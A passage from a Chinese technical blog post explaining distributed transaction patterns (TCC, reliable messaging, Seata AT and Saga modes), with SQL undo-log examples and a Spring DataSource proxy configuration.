<li>在账户表中添加冻结金额字段，值为30，余额不变</li>
</ul>
</li>
<li><p>二阶段</p>
<ul>
<li>提交（Confirm）：真正的扣款，把冻结金额从余额中扣除，冻结金额清空<ul>
<li>修改冻结金额为0，修改余额为100-30 &#x3D; 70元</li>
</ul>
</li>
<li>补偿（Cancel）：释放之前冻结的金额，并非回滚<ul>
<li>余额不变，修改账户冻结金额为0</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="优势和缺点"><a href="#优势和缺点" class="headerlink" title="优势和缺点"></a>优势和缺点</h4><ul>
<li><p>优势</p>
<p>TCC执行的每一个阶段都会提交本地事务并释放锁，并不需要等待其它事务的执行结果。而如果其它事务执行失败，最后不是回滚，而是执行补偿操作。这样就避免了资源的长期锁定和阻塞等待，执行效率比较高，属于性能最好的分布式事务方式。</p>
</li>
<li><p>缺点</p>
<ul>
<li>代码侵入：需要人为编写代码实现，代码侵入较多</li>
<li>开发成本高：一个业务需要拆分成3个步骤，分别编写业务实现，业务编写比较复杂</li>
<li>安全性考虑：cancel动作如果执行失败，资源就无法释放，需要引入重试机制，而重试可能导致重复执行，还要考虑重试时的幂等问题</li>
</ul>
</li>
</ul>
<h4 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h4><p>对事务有一定的一致性要求(最终一致); 对性能要求较高; 开发人员需要具备较高的编码能力和幂等处理经验;</p>
<h3 id="可靠消息服务"><a href="#可靠消息服务" class="headerlink" title="可靠消息服务"></a>可靠消息服务</h3><p>这种实现方式的思路，其实是源于ebay，其基本的设计思想是将远程分布式事务拆分成一系列的本地事务。</p>
<h4 id="基本原理-1"><a href="#基本原理-1" class="headerlink" title="基本原理"></a>基本原理</h4><p>一般分为事务的发起者A和事务的其它参与者B：</p>
<ul>
<li>事务发起者A执行本地事务</li>
<li>事务发起者A通过MQ将需要执行的事务信息发送给事务参与者B</li>
<li>事务参与者B接收到消息后执行本地事务</li>
</ul>
<p>如图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022725.png" alt="image-20200305181454125"></p>
<p>这个过程有点像你去学校食堂吃饭：</p>
<ul>
<li>拿着钱去收银处，点一份红烧牛肉面，付钱</li>
<li>收银处给你发一个小票，还有一个号牌，你别把票弄丢！</li>
<li>你凭小票和号牌一定能领到一份红烧牛肉面，不管需要多久</li>
</ul>
<p>几个注意事项：</p>
<ul>
<li>事务发起者A必须确保本地事务成功后，消息一定发送成功</li>
<li>MQ必须保证消息正确投递和持久化保存</li>
<li>事务参与者B必须确保消息最终一定能消费，如果失败需要多次重试</li>
<li>事务B执行失败，会重试，但不会导致事务A回滚</li>
</ul>
<p>那么问题来了，我们如何保证消息发送一定成功？如何保证消费者一定能收到消息？</p>
<h4 id="本地消息表"><a href="#本地消息表" class="headerlink" title="本地消息表"></a>本地消息表</h4><p>为了避免消息发送失败或丢失，我们可以把消息持久化到数据库中。实现时有简化版本和解耦合版本两种方式。</p>
<h5 id="简化版本"><a href="#简化版本" class="headerlink" title="简化版本"></a>简化版本</h5><p>原理图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022726.png" alt="image-20200305183431211"> </p>
<ul>
<li><p>事务发起者：</p>
<ul>
<li>开启本地事务</li>
<li>执行事务相关业务</li>
<li>发送消息到MQ</li>
<li>把消息持久化到数据库，标记为已发送</li>
<li>提交本地事务</li>
</ul>
</li>
<li><p>事务接收者：</p>
<ul>
<li>接收消息</li>
<li>开启本地事务</li>
<li>处理事务相关业务</li>
<li>修改数据库消息状态为已消费</li>
<li>提交本地事务</li>
</ul>
</li>
<li><p>额外的定时任务</p>
<ul>
<li>定时扫描表中超时未消费消息，重新发送</li>
</ul>
</li>
</ul>
<p><strong>优点：</strong></p>
<ul>
<li>与tcc相比，实现方式较为简单，开发成本低。</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li><p>数据一致性完全依赖于消息服务，因此消息服务必须是可靠的。</p>
</li>
<li><p>需要处理被动业务方的幂等问题</p>
</li>
<li><p>被动业务失败不会导致主动业务的回滚，而是重试被动的业务</p>
</li>
<li><p><strong>事务业务与消息发送业务耦合</strong>、业务数据与消息表要在一起</p>
</li>
</ul>
<h5 id="独立消息服务"><a href="#独立消息服务" class="headerlink" title="独立消息服务"></a>独立消息服务</h5><p>为了解决上述问题，我们会引入一个独立的消息服务，来完成对消息的持久化、发送、确认、失败重试等一系列行为，大概的模型如下：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022727.png" alt="image-20200305200131083"></p>
<p>一次消息发送的时序图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022728.png" alt="image-20200305205430863"></p>
<p>事务发起者A的基本执行步骤：</p>
<ul>
<li>开启本地事务</li>
<li>通知消息服务，准备发送消息（消息服务将消息持久化，标记为准备发送）</li>
<li>执行本地业务，<ul>
<li>执行失败则终止，通知消息服务，取消发送（消息服务修改订单状态）</li>
<li>执行成功则继续，通知消息服务，确认发送（消息服务发送消息、修改订单状态）</li>
</ul>
</li>
<li>提交本地事务</li>
</ul>
<p>消息服务本身提供下面的接口：</p>
<ul>
<li>准备发送：把消息持久化到数据库，并标记状态为准备发送</li>
<li>取消发送：把数据库消息状态修改为取消</li>
<li>确认发送：把数据库消息状态修改为确认发送。尝试发送消息，成功后修改状态为已发送</li>
<li>确认消费：消费者已经接收并处理消息，把数据库消息状态修改为已消费</li>
<li>定时任务：定时扫描数据库中状态为确认发送的消息，然后询问对应的事务发起者，事务业务执行是否成功，结果：<ul>
<li>业务执行成功：尝试发送消息，成功后修改状态为已发送</li>
<li>业务执行失败：把数据库消息状态修改为取消</li>
</ul>
</li>
</ul>
<p>事务参与者B的基本步骤：</p>
<ul>
<li>接收消息</li>
<li>开启本地事务</li>
<li>执行业务</li>
<li>通知消息服务，消息已经接收和处理</li>
<li>提交事务</li>
</ul>
<p><strong>优点：</strong></p>
<ul>
<li>解除了事务业务与消息相关业务的耦合</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>实现起来比较复杂</li>
</ul>
<h4 id="RocketMQ事务消息"><a href="#RocketMQ事务消息" class="headerlink" title="RocketMQ事务消息"></a>RocketMQ事务消息</h4><p>RocketMQ本身自带了事务消息，可以保证消息的可靠性，原理其实就是自带了本地消息表，与我们上面讲的思路类似。</p>
<h4 id="RabbitMQ的消息确认"><a href="#RabbitMQ的消息确认" class="headerlink" title="RabbitMQ的消息确认"></a>RabbitMQ的消息确认</h4><p>RabbitMQ确保消息不丢失的思路比较奇特，并没有使用传统的本地表，而是利用了消息的确认机制：</p>
<ul>
<li>生产者确认机制：确保消息从生产者到达MQ不会有问题<ul>
<li>消息生产者发送消息到RabbitMQ时，可以设置一个异步的监听器，监听来自MQ的ACK</li>
<li>MQ接收到消息后，会返回一个回执给生产者：<ul>
<li>消息到达交换机后路由失败，会返回失败ACK</li>
<li>消息路由成功，持久化失败，会返回失败ACK</li>
<li>消息路由成功，持久化成功，会返回成功ACK</li>
</ul>
</li>
<li>生产者提前编写好不同回执的处理方式<ul>
<li>失败回执：等待一定时间后重新发送</li>
<li>成功回执：记录日志等行为</li>
</ul>
</li>
</ul>
</li>
<li>消费者确认机制：确保消息能够被消费者正确消费<ul>
<li>消费者需要在监听队列的时候指定手动ACK模式</li>
<li>RabbitMQ把消息投递给消费者后，会等待消费者ACK，接收到ACK后才删除消息，如果没有接收到ACK消息会一直保留在服务端，如果消费者断开连接或异常后，消息会投递给其它消费者。</li>
<li>消费者处理完消息，提交事务后，手动ACK。如果执行过程中抛出异常，则不会ACK，业务处理失败，等待下一条消息</li>
</ul>
</li>
</ul>
<p>经过上面的两种确认机制，可以确保从消息生产者到消费者的消息安全，再结合生产者和消费者两端的本地事务，即可保证一个分布式事务的最终一致性。</p>
<h4 id="消息事务的优缺点"><a href="#消息事务的优缺点" class="headerlink" title="消息事务的优缺点"></a>消息事务的优缺点</h4><p>总结上面的几种模型，消息事务的优缺点如下：</p>
<ul>
<li>优点：<ul>
<li>相对TCC，代码侵入较少</li>
<li>业务相对简单</li>
<li>是多个本地事务的结合，因此资源锁定周期短，性能好</li>
</ul>
</li>
<li>缺点：<ul>
<li>依赖于MQ的可靠性</li>
<li>消息发起者可以回滚，但是消息参与者无法引起事务回滚</li>
<li>事务时效性差，取决于MQ消息发送是否及时，还有消息参与者的执行情况</li>
</ul>
</li>
</ul>
<p>针对事务无法回滚的问题，有人提出说可以再事务参与者执行失败后，再次利用MQ通知消息服务，然后由消息服务通知其他参与者回滚。那么，恭喜你，你利用MQ和自定义的消息服务再次实现了2PC 模型，又造了一个大轮子</p>
<h3 id="AT模式"><a href="#AT模式" class="headerlink" title="AT模式"></a>AT模式</h3><p>2019年 1 月份，Seata 开源了 AT 模式。AT 模式是一种<strong>无侵入</strong>的分布式事务解决方案。可以看做是对TCC模式的一种优化，解决了TCC模式中的代码侵入、编码复杂等问题。</p>
<p>在 AT 模式下，用户只需关注自己的“业务 SQL”，用户的 “业务 SQL” 作为一阶段，Seata 框架会自动生成事务的二阶段提交和回滚操作。</p>
<p>可以参考Seata的<a href="https://seata.io/zh-cn/docs/dev/mode/at-mode.html">官方文档</a>。</p>
<h4 id="基本原理-2"><a href="#基本原理-2" class="headerlink" title="基本原理"></a>基本原理</h4><p>先来看一张流程图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022729.png" alt="image-20200305212340203"></p>
<p>有没有感觉跟TCC的执行很像，都是分两个阶段：</p>
<ul>
<li>一阶段：执行本地事务，并返回执行结果</li>
<li>二阶段：根据一阶段的结果，判断二阶段做法：提交或回滚</li>
</ul>
<p>但AT模式底层做的事情可完全不同，而且第二阶段根本不需要我们编写，全部有Seata自己实现了。也就是说：我们写的<strong>代码与本地事务时代码一样</strong>，无需手动处理分布式事务。</p>
<p>那么，AT模式如何实现无代码侵入，如何帮我们自动实现二阶段代码的呢？</p>
<blockquote>
<p>一阶段</p>
</blockquote>
<p>在一阶段，Seata 会拦截“业务 SQL”，首先解析 SQL 语义，找到“<code>业务 SQL</code>”要更新的业务数据，在业务数据被更新前，将其保存成“<code>before image</code>”，然后执行“<code>业务 SQL</code>”更新业务数据，在业务数据更新之后，再将其保存成“<code>after image</code>”，最后获取全局行锁，<strong>提交事务</strong>。以上操作全部在一个数据库事务内完成，这样保证了一阶段操作的原子性。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022730.png" alt="image-20200305213652558"></p>
<blockquote>
<p>二阶段提交</p>
</blockquote>
<p>二阶段如果是提交的话，因为“<code>业务 SQL</code>”在一阶段已经提交至数据库， 所以 Seata 框架只需将一阶段保存的快照数据和行锁删掉，完成数据清理即可。</p>
<blockquote>
<p>二阶段回滚：</p>
</blockquote>
<p>二阶段如果是回滚的话，Seata 就需要回滚一阶段已经执行的“<code>业务 SQL</code>”，还原业务数据。回滚方式便是用“<code>before image</code>”还原业务数据；但在还原前要首先要校验脏写，对比“数据库当前业务数据”和 “<code>after image</code>”，如果两份数据完全一致就说明没有脏写，可以还原业务数据，如果不一致就说明有<code>脏写</code>，出现脏写就需要转人工处理。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022731.png" alt="image-20200305214649845"></p>
<p>不过因为有全局锁机制，所以可以降低出现<code>脏写</code>的概率。</p>
<p>AT 模式的一阶段、二阶段提交和回滚均由 Seata 框架自动生成，用户只需编写“业务 SQL”，便能轻松接入分布式事务，AT 模式是一种对业务无任何侵入的分布式事务解决方案。</p>
<h4 id="详细架构和流程"><a href="#详细架构和流程" class="headerlink" title="详细架构和流程"></a>详细架构和流程</h4><p>Seata中的几个基本概念：</p>
<ul>
<li><p>TC（Transaction Coordinator） - 事务协调者</p>
<p>维护全局和分支事务的状态，驱动全局事务提交或回滚（TM之间的协调者）。</p>
</li>
<li><p>TM（Transaction Manager） - 事务管理器</p>
<p>定义全局事务的范围：开始全局事务、提交或回滚全局事务。</p>
</li>
<li><p>RM（Resource Manager） - 资源管理器</p>
<p>管理分支事务处理的资源，与TC交谈以注册分支事务和报告分支事务的状态，并驱动分支事务提交或回滚。</p>
</li>
</ul>
<p>我们看下面的一个架构图</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022732.png" alt="image-20200305225811888"></p>
<ul>
<li>TM：业务模块中全局事务的开启者<ul>
<li>向TC开启一个全局事务</li>
<li>调用其它微服务</li>
</ul>
</li>
<li>RM：业务模块执行者中，包含RM部分，负责向TC汇报事务执行状态<ul>
<li>执行本地事务</li>
<li>向TC注册分支事务，并提交本地事务执行结果</li>
</ul>
</li>
<li>TM：结束对微服务的调用，通知TC，全局事务执行完毕，事务一阶段结束</li>
<li>TC：汇总各个分支事务执行结果，决定分布式事务是提交还是回滚；</li>
<li>TC 通知所有 RM 提交&#x2F;回滚 资源，事务二阶段结束。</li>
</ul>
<p>一阶段：</p>
<ul>
<li>TM开启全局事务，并向TC声明全局事务，包括全局事务XID信息</li>
<li>TM所在服务调用其它微服务</li>
<li>微服务，主要有RM来执行<ul>
<li>查询<code>before_image</code></li>
<li>执行本地事务</li>
<li>查询<code>after_image</code></li>
<li>生成<code>undo_log</code>并写入数据库</li>
<li>向TC注册分支事务，告知事务执行结果</li>
<li>获取全局锁（阻止其它全局事务并发修改当前数据）</li>
<li>释放本地锁（不影响其它业务对数据的操作）</li>
</ul>
</li>
<li>待所有业务执行完毕，事务发起者（TM）会尝试向TC提交全局事务</li>
</ul>
<p>二阶段：</p>
<ul>
<li>TC统计分支事务执行情况，根据结果判断下一步行为<ul>
<li>分支都成功：通知分支事务，提交事务</li>
<li>有分支执行失败：通知执行成功的分支事务，回滚数据</li>
</ul>
</li>
<li>分支事务的RM<ul>
<li>提交事务：直接清空<code>before_image</code>和<code>after_image</code>信息，释放全局锁</li>
<li>回滚事务：<ul>
<li>校验after_image，判断是否有脏写</li>
<li>如果没有脏写，回滚数据到<code>before_image</code>，清除<code>before_image</code>和<code>after_image</code></li>
<li>如果有脏写，请求人工介入</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="工作机制"><a href="#工作机制" class="headerlink" title="工作机制"></a>工作机制</h4><p>详见Seata的官方文档：<a href="https://seata.io/zh-cn/docs/overview/what-is-seata.html">https://seata.io/zh-cn/docs/overview/what-is-seata.html</a></p>
<blockquote>
<h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4></blockquote>
<p>以一个示例来说明整个 AT 分支的工作过程。</p>
<p>业务表：<code>product</code></p>
<table>
<thead>
<tr>
<th>Field</th>
<th>Type</th>
<th>Key</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>bigint(20)</td>
<td>PRI</td>
</tr>
<tr>
<td>name</td>
<td>varchar(100)</td>
<td></td>
</tr>
<tr>
<td>since</td>
<td>varchar(100)</td>
<td></td>
</tr>
</tbody></table>
<p>AT 分支事务的业务逻辑：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> product <span class="keyword">set</span> name <span class="operator">=</span> <span class="string">&#x27;GTS&#x27;</span> <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;TXC&#x27;</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<h4 id="一阶段"><a href="#一阶段" class="headerlink" title="一阶段"></a>一阶段</h4></blockquote>
<p>过程：</p>
<ol>
<li>解析 SQL：得到 SQL 的类型（UPDATE），表（product），条件（where name &#x3D; ‘TXC’）等相关的信息。</li>
<li>查询前镜像：根据解析得到的条件信息，生成查询语句，定位数据。</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id, name, since <span class="keyword">from</span> product <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;TXC&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>得到前镜像：</p>
<table>
<thead>
<tr>
<th>id</th>
<th>name</th>
<th>since</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>TXC</td>
<td>2014</td>
</tr>
</tbody></table>
<ol>
<li>执行业务 SQL：更新这条记录的 name 为 ‘GTS’。</li>
<li>查询后镜像：根据前镜像的结果，通过 <strong>主键</strong> 定位数据。</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id, name, since <span class="keyword">from</span> product <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>`;</span><br></pre></td></tr></table></figure>

<p>得到后镜像：</p>
<table>
<thead>
<tr>
<th>id</th>
<th>name</th>
<th>since</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>GTS</td>
<td>2014</td>
</tr>
</tbody></table>
<ol>
<li>插入回滚日志：把前后镜像数据以及业务 SQL 相关的信息组成一条回滚日志记录，插入到 <code>UNDO_LOG</code> 表中。</li>
</ol>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;branchId&quot;</span><span class="punctuation">:</span> <span class="number">641789253</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;undoItems&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;afterImage&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;rows&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">				<span class="attr">&quot;fields&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">					<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;id&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="number">4</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">				<span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">					<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;name&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="number">12</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GTS&quot;</span></span><br><span class="line">				<span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">					<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;since&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="number">12</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2014&quot;</span></span><br><span class="line">				<span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">			<span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;tableName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;product&quot;</span></span><br><span class="line">		<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;beforeImage&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;rows&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">				<span class="attr">&quot;fields&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">					<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;id&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="number">4</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">				<span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">					<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;name&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="number">12</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;TXC&quot;</span></span><br><span class="line">				<span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">					<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;since&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="number">12</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2014&quot;</span></span><br><span class="line">				<span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">			<span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;tableName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;product&quot;</span></span><br><span class="line">		<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;sqlType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UPDATE&quot;</span></span><br><span class="line">	<span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;xid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xid:xxx&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ol>
<li>提交前，向 TC 注册分支：申请 <code>product</code> 表中，主键值等于 1 的记录的 <strong>全局锁</strong> 。</li>
<li>本地事务提交：业务数据的更新和前面步骤中生成的 UNDO LOG 一并提交。</li>
<li>将本地事务提交的结果上报给 TC。</li>
</ol>
<blockquote>
<h4 id="二阶段-回滚"><a href="#二阶段-回滚" class="headerlink" title="二阶段-回滚"></a>二阶段-回滚</h4></blockquote>
<ol>
<li>收到 TC 的分支回滚请求，开启一个本地事务，执行如下操作。</li>
<li>通过 XID 和 Branch ID 查找到相应的 UNDO LOG 记录。</li>
<li>数据校验：拿 UNDO LOG 中的后镜与当前数据进行比较，如果有不同，说明数据被当前全局事务之外的动作做了修改。这种情况，需要根据配置策略来做处理，详细的说明在另外的文档中介绍。</li>
<li>根据 UNDO LOG 中的前镜像和业务 SQL 的相关信息生成并执行回滚的语句：</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> product <span class="keyword">set</span> name <span class="operator">=</span> <span class="string">&#x27;TXC&#x27;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<ol>
<li>提交本地事务。并把本地事务的执行结果（即分支事务回滚的结果）上报给 TC。</li>
</ol>
<blockquote>
<h4 id="二阶段-提交"><a href="#二阶段-提交" class="headerlink" title="二阶段-提交"></a>二阶段-提交</h4></blockquote>
<ol>
<li>收到 TC 的分支提交请求，把请求放入一个异步任务的队列中，马上返回提交成功的结果给 TC。</li>
<li>异步任务阶段的分支提交请求将异步和批量地删除相应 UNDO LOG 记录。</li>
</ol>
<h4 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h4><p>优点：</p>
<ul>
<li>与2PC相比：每个分支事务都是独立提交，不互相等待，减少了资源锁定和阻塞时间</li>
<li>与TCC相比：二阶段的执行操作全部自动化生成，无代码侵入，开发成本低</li>
</ul>
<p>缺点：</p>
<ul>
<li>与TCC相比，需要动态生成二阶段的反向补偿操作，执行性能略低于TCC</li>
</ul>
<h3 id="Saga模式"><a href="#Saga模式" class="headerlink" title="Saga模式"></a>Saga模式</h3><p>Saga [ˈsɑːɡə]模式是 Seata 即将开源的长事务解决方案，将由蚂蚁金服主要贡献。</p>
<p>其理论基础是Hector&amp;Kenneth在1987年发表的论文<a href="https://microservices.io/patterns/data/saga.html">Sagas</a>。</p>
<p>Seata官网对于Saga的指南：<a href="https://seata.io/zh-cn/docs/user/saga.html">https://seata.io/zh-cn/docs/user/saga.html</a></p>
<h4 id="基本模型"><a href="#基本模型" class="headerlink" title="基本模型"></a>基本模型</h4><p>在 Saga 模式下，分布式事务内有多个参与者，每一个参与者都是一个冲正补偿服务，需要用户根据业务场景实现其正向操作和逆向回滚操作。</p>
<p>分布式事务执行过程中，依次执行各参与者的正向操作，如果所有正向操作均执行成功，那么分布式事务提交。如果任何一个正向操作执行失败，那么分布式事务会去退回去执行前面各参与者的逆向回滚操作，回滚已提交的参与者，使分布式事务回到初始状态。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022733.png" alt="Saga 模式"> </p>
<p>Saga 模式下分布式事务通常是由事件驱动的，各个参与者之间是异步执行的，Saga 模式是一种长事务解决方案。</p>
<h4 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h4><ul>
<li>业务流程长、业务流程多</li>
<li>参与者包含其它公司或遗留系统服务，无法提供 TCC 模式要求的三个接口</li>
</ul>
<h4 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h4><ul>
<li>一阶段提交本地事务，无锁，高性能</li>
<li>事件驱动架构，参与者可异步执行，高吞吐</li>
<li>补偿服务易于实现</li>
</ul>
<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><ul>
<li>不保证隔离性（应对方案见<a href="https://seata.io/zh-cn/docs/user/saga.html">用户文档</a>）</li>
</ul>
<h2 id="Seata"><a href="#Seata" class="headerlink" title="Seata"></a>Seata</h2><p>Seata（Simple Extensible Autonomous Transaction Architecture，简单可扩展自治事务框架）是 2019 年 1 月份蚂蚁金服和阿里巴巴共同开源的分布式事务解决方案。Seata 开源半年左右，目前已经有接近一万 star，社区非常活跃。我们热忱欢迎大家参与到 Seata 社区建设中，一同将 Seata 打造成开源分布式事务标杆产品。</p>
<p>Seata：<a href="https://github.com/seata/seata">https:&#x2F;&#x2F;</a><a href="https://github.com/seata/seata">github.com&#x2F;seata&#x2F;seata</a></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022734.png" alt="image-20210415162035629"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022735.png" alt="image-20210415162052256"></p>
<h3 id="AT模式实战"><a href="#AT模式实战" class="headerlink" title="AT模式实战"></a>AT模式实战</h3><p>首先在application.yml中添加一行配置：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">alibaba:</span></span><br><span class="line">      <span class="attr">seata:</span></span><br><span class="line">        <span class="attr">tx-service-group:</span> <span class="string">test_tx_group</span> <span class="comment"># 定义事务组的名称</span></span><br></pre></td></tr></table></figure>

<p>这里是定义事务组的名称，接下来会用到。</p>
<p>然后是在<code>resources</code>目录下放两个配置文件：<code>file.conf</code>和<code>registry.conf</code></p>
<p>其中，<code>registry.conf</code>与TC服务端的一样，此处不再讲解。</p>
<p>Seata的二阶段执行是通过拦截sql语句，分析语义来指定回滚策略，因此需要对DataSource做代理。我们在项目的<code>cn.itcast.order.config</code>包中，添加一个配置类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.order.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.extension.spring.MybatisSqlSessionFactoryBean;</span><br><span class="line"><span class="keyword">import</span> io.seata.rm.datasource.DataSourceProxy;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSessionFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DataSourceProxyConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SqlSessionFactory <span class="title function_">sqlSessionFactoryBean</span><span class="params">(DataSource dataSource)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 订单服务中引入了mybatis-plus，所以要使用特殊的SqlSessionFactoryBean</span></span><br><span class="line">        <span class="type">MybatisSqlSessionFactoryBean</span> <span class="variable">sqlSessionFactoryBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MybatisSqlSessionFactoryBean</span>();</span><br><span class="line">        <span class="comment">// 代理数据源</span></span><br><span class="line">        sqlSessionFactoryBean.setDataSource(<span class="keyword">new</span> <span class="title class_">DataSourceProxy</span>(dataSource));</span><br><span class="line">        <span class="comment">// 生成SqlSessionFactory</span></span><br><span class="line">        <span class="keyword">return</span> sqlSessionFactoryBean.getObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

